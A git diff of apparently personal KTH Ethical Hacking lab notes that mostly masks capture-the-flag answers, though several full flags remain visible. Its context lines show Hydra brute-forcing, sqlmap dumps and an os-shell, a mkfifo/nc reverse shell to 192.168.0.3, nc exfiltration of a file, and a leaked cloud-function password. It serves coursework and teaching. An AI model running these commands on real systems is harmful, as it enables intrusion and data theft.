@@ -2,7 +2,7 @@
 [toc]
 
 # Map
-This is the review notes for the course named Ethical Hacking at KTH. I have already deleted all specific clues for searching the exact flags(except the tutorial one)
+This is the review notes for the course named Ethical Hacking at KTH. I have already deleted the exact flags(except the tutorial one)
 
 # Environment
 1. Linux Kali: downloaded from official website.
@@ -790,7 +790,7 @@ Skill to do comes of doing;
 knowledge comes by eyes always open, and working hands; 
 and there is no knowledge that is not power.
 
-flag{155d78a0c326eccc546bd9390e133535991f98351686fd}
+flag{155d78a0c326eccc546bd9390e13353599？？？？？
 ```
 
 
@@ -846,7 +846,9 @@ Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds>
 公开提示是ftp，所以用hydra攻击ftp服务。
 这里使用了文本替换，先另外做了一个符合login:password格式的mirai-botnet.txt，再执行下面的命令。
 
-对这个旗来说seclists白安装了。
+得到命中密码以后ftp IP，进入目标机器的命令行界面，可以找到flag。
+
+因为密码比较简单一下找到了，所以对这个旗来说seclists白安装了。
 
 ```shell
 ┌──(kali㉿kali)-[~/Desktop/0919]
@@ -860,36 +862,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-16 20:16:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-16 20:16:52
 
-┌──(kali㉿kali)-[~/Desktop/0919]
-└─$ ftp 10.0.2.164
-Connected to 10.0.2.164.
-220 Microsoft FTP Service
-Name (10.0.2.164:kali): root
-331 Password required
-Password: 
-230 User logged in.
-Remote system type is Windows_NT.
-ftp> ls
-229 Entering Extended Passive Mode (|||59358|)
-125 Data connection already open; Transfer starting.
-09-15-22  08:44AM                29199 flag{adcb1f5d8af5004c29345c6718685eb45e72212bbbaa53}.jpg
-226 Transfer complete.
-ftp> lcd
-Local directory now: /home/kali
-ftp> lcd Desktop/
-Local directory now: /home/kali/Desktop
-ftp> get flag{adcb1f5d8af5004c29345c6718685eb45e72212bbbaa53}.jpg
-local: flag{adcb1f5d8af5004c29345c6718685eb45e72212bbbaa53}.jpg remote: flag{adcb1f5d8af5004c29345c6718685eb45e72212bbbaa53}.jpg
-229 Entering Extended Passive Mode (|||59374|)
-125 Data connection already open; Transfer starting.
-100% |*********************************************| 29199      369.91 KiB/s    00:00 ETA
-226 Transfer complete.
-WARNING! 105 bare linefeeds received in ASCII mode.
-File may not have transferred correctly.
-29199 bytes received in 00:00 (369.22 KiB/s)
-226 Transfer complete.
-ftp> exit
-221 Goodbye.
 ```
 
 ## 扫描与漏洞发现
@@ -936,8 +908,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-18 17:46:
 
 ┌──(kali㉿kali)-[~/Desktop/0919]
 └─$ curl http://10.0.2.164:8282/hacktheplanet-816494cc2ba913de/
-<img src="C:\ProgramData\Tomcat9\webapps\hacktheplanet-816494cc2ba913de\flag{90b353a3878151640b532b0b30b5c828eab1855cdc97cb}.jpg" alt="wooow, what a flag"/>
+<img src="C:\ProgramData\Tomcat9\webapps\hacktheplanet-816494cc2ba913de\flag{？？？？}.jpg" alt="wooow, what a flag"/>
 ```
+
+思路是扫描端口然后挨个儿试探。其中8282是一个tomcat服务。该IP的网页界面是经由tomcat管理的。
 
 这里记录一些没用的hydra命令：
 > hydra -C mirai-botnet.txt 10.0.2.164 http-get -e ns /host-manager/ -s 8282  
@@ -973,7 +947,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
 ```
 ┌──(kali㉿kali)-[~/Desktop/0919]
 └─$ grep -r flag      
-test1/_i12/5/response.dat:<!-- flag{521bce090e5b9e19a5e7c2ec9642f27e1d641c5fd72aad} -->
+test1/_i12/5/response.dat:<!-- flag{？？？？？？} -->
 ......以及还有好多地方也有
 ```
 
@@ -1025,7 +999,7 @@ Database: cuiteur
 +---------+------------------------------------------------------+
 | flag_id | flag                                                 |
 +---------+------------------------------------------------------+
-| 32f28e  | flag{de3b1c0b21c23afd5b00f2cea90c1ad57508af8b47d866} |
+| 32f28e  | flag{？？？？？？} |
 +---------+------------------------------------------------------+
 
 [20:59:16] [INFO] table 'cuiteur.flags' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.0.3.107/dump/cuiteur/flags.csv'                                                                
@@ -1092,7 +1066,7 @@ os-shell> ls ..
 do you want to retrieve the command standard output? [Y/n/a] 
 command standard output:
 
-flag{3b20004ce00da2fe130041816c690d7dc53555ca3d3315}.jpg
+flag{3b2000？？？？？}.jpg
 html
 images
 index.html
@@ -1102,7 +1076,7 @@ styles
 upload
 ```
 
-找到了字符串，但是，尝试运行`$ sqlmap -r ~/Desktop/0926/r.raw --file-read "/var/www/html/flag{3b20004ce00da2fe130041816c690d7dc53555ca3d3315}.jpg"`失败了。
+找到了字符串，但是，尝试运行`$ sqlmap -r ~/Desktop/0926/r.raw --file-read "/var/www/html/flag{3b20004ce0？？？？}.jpg"`失败了。
 关于更多信息如Privileges等参考`[10:34:43] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.0.3.107'`
 但是可以用完整的url通过浏览器把图片保存下来。
 
@@ -1358,8 +1332,8 @@ cat cuiteur-cleaning
 #!/bin/bash
 
 /bin/chmod -R 755 /root
-/bin/chmod 755 /root/flag{9f1f16a4aa83a78818defd059852fc1f2bfbf02882fbb5}.jpg
-/bin/chmod 755 /root/flag{3b200098aa585d4078530733472b7f4ee0fc60702e32d9}.jpg
+/bin/chmod 755 /root/flag{9f1f16a？？？}.jpg
+/bin/chmod 755 /root/flag{3b200098a？？？？}.jpg
 /bin/echo -e "corner\ncorner" | /usr/bin/passwd root
 /usr/bin/find /var/www/html -name *.tmp -exec rm {} +
 /bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.3 7878 > /tmp/tfl
@@ -1446,7 +1420,7 @@ https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4
   scp C:\Users\Desktop\webtest\1.zip root@192.168.1.1:/home/admin
 
 ### mimikatz
-在自己机器上运行mimikatz
+下载必要文件以后就可以在自己机器上运行mimikatz
 
 ```shell
 
@@ -1814,10 +1788,10 @@ Password:
 
 goldstein@en2720-w11-sea-turtle:~$ cd ..
 goldstein@en2720-w11-sea-turtle:/home$ ls
-flag{f9038f106c596f0efee8cdd1a552e649efd0ee84cca6b8}.jpg  goldstein  printer  sa_117153760595540998566  ubuntu
+flag{f9038？？？？}.jpg  goldstein  printer  sa_117153760595540998566  ubuntu
 
 ```
-这里也可以把之前得到的用户名密码对做成词典使用haydra。
+这里也可以把之前得到的用户名密码对做成词典使用hydra。
 
 ## Privilege escalation
 
@@ -1955,7 +1929,7 @@ Mode              Size  Type  Last modified              Name
 040755/rwxr-xr-x  4096  dir   2022-09-04 22:29:31 -0400  .npm
 100644/rw-r--r--  148   fil   2015-08-17 11:30:33 -0400  .profile
 040700/rwx------  4096  dir   2022-09-28 09:57:04 -0400  .ssh
-100600/rw-------  5403  fil   2022-09-05 20:14:25 -0400  flag{6be6ef9fcba25bbe7593627b72008033459731da94fc8a}.jpg
+100600/rw-------  5403  fil   2022-09-05 20:14:25 -0400  flag{6be6ef9fcba25bbe7593627b72？？？？？？}.jpg
 ```
 
 
@@ -2007,7 +1981,7 @@ Hypertext Transfer Protocol
     Accept-Language: en-US,en;q=0.5\r\n
     Accept-Encoding: gzip, deflate\r\n
     Referer: http://cuiteur-s14.ethhak/styles/cuiteur.css\r\n
-    X-Ethhak-Flag-Content: flag{14ce18b7e724bb65090e1898418319d6f5a7f037a5c1ec}\r\n
+    X-Ethhak-Flag-Content: flag{14ce18b7e724bb65090e1898418319d6f5？？？}\r\n
     Connection: keep-alive\r\n
     \r\n
     [Full request URI: http://cuiteur-s14.ethhak/images/trait.png]
@@ -2075,7 +2049,7 @@ set uripath / 意思是对请求首页的客户进行攻击？
 
 ```
 ls /home/ubuntu/
-nc 192.168.0.7 9995 < /home/ubuntu/flag{5d402eae2e4bd33b0d0e3435b6d3b7670b75f90ce6f7eb}.jpg
+nc 192.168.0.7 9995 < /home/ubuntu/flag{5d402eae2e4bd33b0d0e34？？？？？？？}.jpg
 ```
 这个shell也很垃圾，不能切换目录而且一分钟左右就断掉。nc可以用。想用msf获得反向shell但是失败了，是因为防火墙的原因？
 ```
@@ -2609,7 +2583,7 @@ git clone https://source.developers.google.com/p/en2720-2017/r/twmn_sourcerepo_e
 https://cloud.google.com/storage/docs/downloading-objects
 ```shell
 root@en2720-w11-cloud-hopper:~# gcloud storage ls --recursive gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/**
-gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/flag{21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d}.jpg
+gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/flag{21077e6b115139f405c3f7d6？？？？？？？？}.jpg
 gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/googlecloudfunction.spec
 gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/wifi-ssh-key
 gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/wifi-ssh-key.pub
@@ -2667,7 +2641,7 @@ root@en2720-w11-cloud-hopper:~# curl "https://storage.googleapis.com/storage/v1/
       "id": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/flag{21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d}.jpg/1665621053239775",
       "selfLink": "https://www.googleapis.com/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/flag%7B21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d%7D.jpg",
       "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/flag%7B21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d%7D.jpg?generation=1665621053239775&alt=media",
-      "name": "flag{21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d}.jpg",
+      "name": "flag{21077e6b115139f405c？？？}.jpg",
       "bucket": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99",
       "generation": "1665621053239775",
       "metageneration": "1",
@@ -2826,7 +2800,7 @@ root@en2720-w11-cloud-hopper:~/.7# curl "https://europe-west1-en2720-2017.cloudf
 {"from":"Ethical Hacking Function","message":"Hello, I am a cloud function."}
 
 root@en2720-w11-cloud-hopper:~/.7# curl "https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11" -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"message":"process.env" , "debug": "f6Bpn0m9WG"}' 
-{"from":"Ethical Hacking Function","message":{"GCF_BLOCK_RUNTIME_nodejs6":"410","LD_LIBRARY_PATH":"/layers/google.nodejs.runtime/node/lib","FUNCTION_TARGET":"iDareYouToHackMe","GCF_BLOCK_RUNTIME_go112":"410","NODE_OPTIONS":"--max-old-space-size=64","PASSWORD":"f6Bpn0m9WG","PWD":"/workspace","HOME":"/root","DEBIAN_FRONTEND":"noninteractive","PORT":"8080","K_REVISION":"1","FLAG":"flag{83186535ae7a6d39dda377da003a4dc85eab34e8893abf}","K_SERVICE":"twmn_cloud_hack_en2720-w11","SHLVL":"1","FUNCTION_SIGNATURE_TYPE":"http","PATH":"/layers/google.nodejs.runtime/node/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","_":"/layers/google.nodejs.functions-framework/functions-framework/node_modules/.bin/functions-framework"}}
+{"from":"Ethical Hacking Function","message":{"GCF_BLOCK_RUNTIME_nodejs6":"410","LD_LIBRARY_PATH":"/layers/google.nodejs.runtime/node/lib","FUNCTION_TARGET":"iDareYouToHackMe","GCF_BLOCK_RUNTIME_go112":"410","NODE_OPTIONS":"--max-old-space-size=64","PASSWORD":"f6Bpn0m9WG","PWD":"/workspace","HOME":"/root","DEBIAN_FRONTEND":"noninteractive","PORT":"8080","K_REVISION":"1","FLAG":"flag{83186535ae7a6d39dda377da003？？？？？}","K_SERVICE":"twmn_cloud_hack_en2720-w11","SHLVL":"1","FUNCTION_SIGNATURE_TYPE":"http","PATH":"/layers/google.nodejs.runtime/node/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","_":"/layers/google.nodejs.functions-framework/functions-framework/node_modules/.bin/functions-framework"}}
 
 ```
 
@@ -3048,20 +3022,20 @@ razor@en2720-w11-fancy-bear:~/.7$ curl 172.20.0.2
 <a href="/">/</a></h1><hr noshade size=1><pre>
 <b>access      user      group     date             size  name</b>
 
--rw-------     65534     65534  Oct 16 01:00    71 kB  <a href="flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg">flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg</a>
+-rw-------     65534     65534  Oct 16 01:00    71 kB  <a href="flag{18dd8ff4747815ee606？？？？}.jpg">flag{18dd8ff4747815ee60？？？}.jpg</a>
 </pre><hr noshade size=1>
 <small><a href="http://bytesex.org/webfs.html">webfs/1.21</a> &nbsp; 16/Oct/2022 14:43:57 GMT</small>
 </body>
-razor@en2720-w11-fancy-bear:~/.7$ wget 172.20.0.2/flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg
+razor@en2720-w11-fancy-bear:~/.7$ wget 172.20.0.2/flag{18dd8ff4747815ee6069351？？？}.jpg
 --2022-10-16 16:44:39--  http://172.20.0.2/flag%7B18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7%7D.jpg
 Connecting to 172.20.0.2:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 72906 (71K) [image/jpeg]
-Saving to: ‘flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg’
+Saving to: ‘flag{18dd8ff4747815ee60693510d76？？？}.jpg’
 
 flag{18dd8ff4747815ee606935 100%[========================================>]  71.20K  --.-KB/s    in 0.05s   
 
-2022-10-16 16:44:39 (1.51 MB/s) - ‘flag{18dd8ff4747815ee60693510d761d3b49b248f35a3f8d7}.jpg’ saved [72906/72906]
+2022-10-16 16:44:39 (1.51 MB/s) - ‘flag{18dd8ff4747815ee60693510d761d3？？？？}.jpg’ saved [72906/72906]
 
 ```
 
